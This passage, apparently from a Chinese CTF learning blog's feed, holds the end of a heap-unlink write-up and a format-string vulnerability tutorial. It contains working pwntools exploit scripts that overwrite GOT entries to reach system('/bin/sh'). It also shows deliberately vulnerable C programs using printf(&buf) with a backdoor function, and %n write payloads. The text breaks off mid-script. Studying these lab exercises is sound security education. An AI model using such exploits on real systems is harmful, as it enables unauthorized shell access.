class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"a"</span>*<span class="number">0</span>x<span class="number">10</span>+p<span class="number">64</span><span class="comment">(free_got)</span>+p<span class="number">64</span><span class="comment">(puts_got)</span>+p<span class="number">64</span><span class="comment">(atoi_got)</span>&lt;br&gt;</span><br><span class="line">此时        <span class="attr">#1</span>            <span class="attr"># 2</span>                   <span class="attr">#3</span></span><br></pre></td></tr></table></figure><p>然后我们向 #1中再写入 free_plt ,即把 free_got 写入 puts_plt,<br><br>然后 free(#2)  就相当于  putsplt(puts_got),从而泄露 libc<br><br>继而 得到 system_addr<br><br>然后我们向 #3中写入 system_addr.<br><br>即 atoi_got中 存着是 system_addr.<br></p><p>所以我们输入 “/bin/sh\x00”即可 拿到shell。</p><h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.<span class="attribute">log_level</span>=<span class="string">"debug"</span></span><br><span class="line">def <span class="builtin-name">add</span>(size):</span><br><span class="line">  p.sendline(<span class="string">"1"</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">     </span><br><span class="line">def free(index):</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    </span><br><span class="line">def <span class="builtin-name">edit</span>(index,payload):</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.sendline(str(len(payload)))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">p = process(<span class="string">"./stkof"</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",25338)</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line"></span><br><span class="line">globals = 0x0602140</span><br><span class="line"><span class="builtin-name">add</span>(0x80)</span><br><span class="line"><span class="builtin-name">add</span>(0x80)          #与下一个 chunk 是连续的</span><br><span class="line"><span class="builtin-name">add</span>(0x80)          #所以主要利用 这两个 实现unlink </span><br><span class="line"><span class="builtin-name">add</span>(0x20)          # 防止和 top chunk 合并</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">FD = globals+16-0x18</span><br><span class="line">BK = globals+16-0x10</span><br><span class="line">payload = p64(0)+p64(0x80)+p64(FD)+p64(BK)</span><br><span class="line">payload = payload.ljust(0x80,<span class="string">'A'</span>)</span><br><span class="line">payload += p64(0x80) + p64(0x90)</span><br><span class="line"><span class="builtin-name">edit</span>(2, payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(3)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"free_got"</span>+hex(free_got)+<span class="string">"********************************"</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"puts_got"</span>+hex(puts_got)+<span class="string">"********************************"</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"puts_plt"</span>+hex(puts_plt)+<span class="string">"********************************"</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"atoi_got"</span>+hex(atoi_got)+<span class="string">"********************************"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span><span class="number">*16</span> + p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">                    #1                 #2              #3</span><br><span class="line"><span class="builtin-name">edit</span>(2,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="builtin-name">edit</span>(1,p64(puts_plt))          #free_got -&gt;puts_plt</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">free(2)                        #puts(puts_got)</span><br><span class="line">p.recv(0x20)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,<span class="string">"\x00"</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc.sym[<span class="string">'system'</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"puts_addr"</span>+hex(puts_addr)+<span class="string">"********************************"</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"libc_base"</span>+hex(libc_base)+<span class="string">"********************************"</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"system_addr"</span>+hex(system_addr)+<span class="string">"********************************"</span></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">edit</span>(3,p64(system_addr))</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.secpulse.com/archives/115388.html</span></span><br><span class="line">unlink：</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//hpasserby.top/post/dbc7b210.html</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//bbs.ichunqiu.com/thread-46614-1-1.html?from=bkyl</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//eternalsakura13.com/2018/03/01/unlink1/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近总是觉得 堆的好多知识点都稍微有些了解，但却根本不能善于 去利用他们， 感觉是件很可怕的事，于是打算 重新再学一次，尽量将原理解透彻！&lt;br&gt;这次就 学习下 unlink。&lt;br&gt;一般只在  存在堆溢出，知道全局结构体数组地址， got 可改， 不开启 pie 和full relro 的情况下使用。&lt;/p&gt;
    
    </summary>
    
    
      <category term="堆学习" scheme="http://yoursite.com/tags/%E5%A0%86%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞及利用_完全讲解</title>
    <link href="http://yoursite.com/2020/04/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8_%E5%AE%8C%E5%85%A8%E8%AE%B2%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/04/26/格式化字符串漏洞及利用_完全讲解/</id>
    <published>2020-04-26T13:50:46.000Z</published>
    <updated>2020-04-26T13:54:37.101Z</updated>
    
    <content type="html"><![CDATA[<p>这里记录了 常见格式化字符串的漏洞的知识和利用。（注，关于bss 段上的格式化字符串 忘记写了，回头补充下！）</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>格式化字符串漏洞 具有 任意地址读，任意地址写。</p><h1 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h1><h3 id="printf-–一个参数：情况1"><a href="#printf-–一个参数：情况1" class="headerlink" title="printf –一个参数：情况1"></a>printf –一个参数：情况1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当参数 只有 1个字符串的话(含有%?)，  //？  即 i， x， s 等等<br><br>第一个参数 作为 格式化字符串，<br><br>而这个格式化字符串里含有解析 字符串的 %p ，它将<br>第一个参数作为 格式化字符串，<br><br>第二个参数 作为 格式化字符串的参数表 中的第一个参数 即 %p 对应 栈中 0xffffd144 的内容，//它将栈中 0xffffd144 的内容 以带有0x 的16进制显示出来。<br><br>（32位 程序传参方式 传到栈上，栈地址 0xffffd144 中的内容为 第二个参数）<br><img src="https://s1.ax1x.com/2020/03/26/8zSXB4.png" alt="8zSXB4.png"></p><p><img src="https://s1.ax1x.com/2020/03/26/8zSOuF.png" alt="8zSOuF.png"></p><h3 id="printf-–一个参数：情况2"><a href="#printf-–一个参数：情况2" class="headerlink" title="printf –一个参数：情况2"></a>printf –一个参数：情况2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"yangmutou!!!\n"</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当参数 只有 1个字符串的话(不含有%?)，在Linux中会 被转化为puts(arg)    //？  即 i， x， s 等等<br><img src="https://s1.ax1x.com/2020/03/26/8zSqjU.png" alt="8zSqjU.png"></p><h3 id="printf-–两个参数："><a href="#printf-–两个参数：" class="headerlink" title="printf –两个参数："></a>printf –两个参数：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">12</span>]=<span class="string">"yangmutou!!!"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s!!!\n"</span>,a);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当两个参数 时，<br><br>第一个参数作为 格式化字符串，<br><br>第二个参数 作为 格式化字符串的参数表 中的第一个参数 即 %s 对应 “yangmutou”<br><img src="https://s1.ax1x.com/2020/03/26/8zSbcT.png" alt="8zSbcT.png"></p><h3 id="printf-–三个参数："><a href="#printf-–三个参数：" class="headerlink" title="printf –三个参数："></a>printf –三个参数：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">12</span>]=<span class="string">"yangmutou!!!"</span>;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s!!!\nage: %d\n"</span>,a,b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当三个参数 时，<br><br>第一个参数作为 格式化字符串，<br><br>第二个参数 作为 格式化字符串的参数表 中的第一个参数   即 %s 对应 “yangmutou”<br><br>第三个参数 作为 格式化字符串的参数表 中的第二个参数   即 %d 对应   20<br><img src="https://s1.ax1x.com/2020/03/26/8zSH3V.png" alt="8zSH3V.png"></p><h1 id="任意地址-读"><a href="#任意地址-读" class="headerlink" title="任意地址 读"></a>任意地址 读</h1><p>而这个函数是有漏洞的<br>我们简单 看下面我写的例子：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 fmt.c -o fmt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以控制 printf 的参数。<br><br>我们输入 “aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p”到 0xffffd11c 栈地址处<br><img src="https://s1.ax1x.com/2020/03/26/8zSjHJ.png" alt="8zSjHJ.png"></p><ol><li>可以看到 我们输入的这一整个字符串 作为了  格式化字符串，<br></li><li>aaaa后面的第一个 %p 被 格式化字符串的参数表 中的第一个参数(0xffffd100+0x4*1中的内容) 解析成“0x + 16进制”0xffffd11c     然后替换掉<br></li><li>aaaa后面的第二个 %p 被 格式化字符串的参数表 中的第二个参数(0xffffd100+0x4*2中的内容) 解析成“0x + 16进制” 0x64            然后替换掉<br></li><li>aaaa后面的第二个 %p 被 格式化字符串的参数表 中的第三个参数(0xffffd100+0x4*3中的内容) 解析成“0x + 16进制” 0x5655561e  然后替换掉<br></li></ol><p>具体可以 看下面的 gdb 截图：<br><img src="https://s1.ax1x.com/2020/03/26/8zSxE9.png" alt="8zSxE9.png"></p><p>此时的栈：<br><img src="https://s1.ax1x.com/2020/03/26/8zSzNR.png" alt="8zSzNR.png"></p><p>另外 我们可以通过这种 方法  得到 ，第 7 个 %p 被替换成  0x61616161，即我们输入的 字符串 存到了 偏移 为 7 的 位置。<br>这里的偏移  可以理解为 上面 的 “格式化字符串的参数表 中的第 x 个参数”<br>另外  我们可以通过输入 %offset$p   直接输出 偏移为 7 处的内容(“0x + 16进制”)<br>试下 输出结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./fmt</span></span><br><span class="line"><span class="meta">aaaa%</span><span class="bash">7<span class="variable">$p</span></span></span><br><span class="line">aaaa0x61616161</span><br></pre></td></tr></table></figure><p>我们可以观察下   栈地址 0xffffd11c+0x4*2 处中的地址是个   指向字符串的指针<br><img src="https://s1.ax1x.com/2020/03/26/8zpS41.png" alt="8zpS41.png"></p><p>我们可以<br>输出结果：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span><span class="variable">$s</span></span><br><span class="line"><span class="regexp">/home/y</span>angmutou<span class="regexp">/桌面/</span>fmt</span><br></pre></td></tr></table></figure><p>总结：即格式化漏洞的任意地址 读 其实仅需要 通过 “%偏移$格式输出” 便可以了，利用方式  很简单。<br>这里主要 就是 要特别 注意一点，这里的偏移 是指的格式化 字符串的第几个参数，而不是说是printf 函数的第几个参数呐，<br>因为 本来 格式化字符串   就是 printf 函数的第一个参数。两者 有 相差 1 的数学等式 关系。 </p><h1 id="任意地址-写"><a href="#任意地址-写" class="headerlink" title="任意地址 写"></a>任意地址 写</h1><p>我们还看  上面我写的小例子。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 不存在栈溢出，但我们要 getshell又 需要将 返回地址 给覆盖成 backdoor 地址。即需要利用格式化字符串漏洞的  任意地址写。</p><p>首先：</p><p>bss_addr : 0804a028   //readelf -S fmt | grep bss  得到<br>在格式化字符串 中 有一个 特殊的格式化控制符 “%n”，它可以将已经输出的字节个数写入到 指定的 的地址中<br>一般使用方式：<br>“\x28\xa0\x04\x08%7$n”,就是 将 已经输出的字节个数 写入到 指定的地址0x0804a028 处<br>（这里指定的地址处就是 偏移为7(格式化字符串的第7个参数) 的栈地址中的内容，即就是  我们写入的0x0804a024 指定地址）</p><p>payload 写成上面形式  理论上 是可以成功的，但我这次确失败了。<br>于是就写脚本形式吧。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=0x0804a028</span><br><span class="line">offset=7</span><br><span class="line">payload=p32(bss_addr)+<span class="string">"%7$n"</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>输入之前：</p><p><img src="https://s1.ax1x.com/2020/03/26/8zp99x.png" alt="8zp99x.png"></p><p>输入 之后 ：</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpC36.png" alt="8zpC36.png"></p><p>可以发现 4 被写入发 0x0804a024 中了   ,4即是p32(0x0804a024)的字节数。输出到屏幕上 的。</p><p>以上我们就算是演示下 任意写的 简单用法了。</p><p>而这题  我原本想的 是  将 backaddr 的地址写入 ret_addr,脚本如下：<br>但失败了，因为想法  就是错的。</p><p>如果我们采用 下面exp 的方法  ，是向 ret_addr 所在栈地址中的 内容 作为指针 ，向这个 指针中 写入  0x80484b6 。<br>而并不是 把 ret_addr 所在栈地址 作为指针，并不是向栈地址中写入 0x80484b6</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line"></span><br><span class="line">backdoor=0x80484b6</span><br><span class="line">offset=(0x8c-0xc)/4+7</span><br><span class="line">payload=p32(backdoor)+<span class="string">"%"</span>+str(backdoor-4)+<span class="string">"c%"</span>+str(offset)+<span class="string">"$n"</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>所以 ，换思路：<br>我们 将printf_got 指针指向的 地址  改为  system_plt</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpPgK.png" alt="8zpPgK.png"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt"</span>)</span><br><span class="line">offset=7</span><br><span class="line">printf_got=elf.got['printf']<span class="comment">#0x0804a010</span></span><br><span class="line">system_plt=elf.plt['system']<span class="comment">#0x08048360</span></span><br><span class="line">print <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line">print <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p32(printf_got)+<span class="string">"%"</span>+str(system_plt-4)+<span class="string">"c%7$n"</span><span class="comment"># make printf_got -&gt; system_plt</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到  printf_got 指针指向的 地址  改为了  system_plt</p><p>所以，printf(&amp;arg),就相当于 system(&amp;arg)了，如果我们再发送 “/bin/sh\x00”,作为arg 就能getshell了。<br>但 程序只能运行一次。</p><p> 为了学习。我们加上循环，重新编译。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -m32 -fno-stack-protector -no-pie -o fmt fmt.c    为了调试方便，关闭canary 和pie 保护</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt"</span>)</span><br><span class="line">offset=7</span><br><span class="line">printf_got=elf.got['printf']<span class="comment">#0x0804a010</span></span><br><span class="line">system_plt=elf.plt['system']<span class="comment">#0x08048360</span></span><br><span class="line">print <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line">print <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line">payload=p32(printf_got)+<span class="string">"%"</span>+str(system_plt-4)+<span class="string">"c%7$n"</span><span class="comment"># make printf_got -&gt; system_plt</span></span><br><span 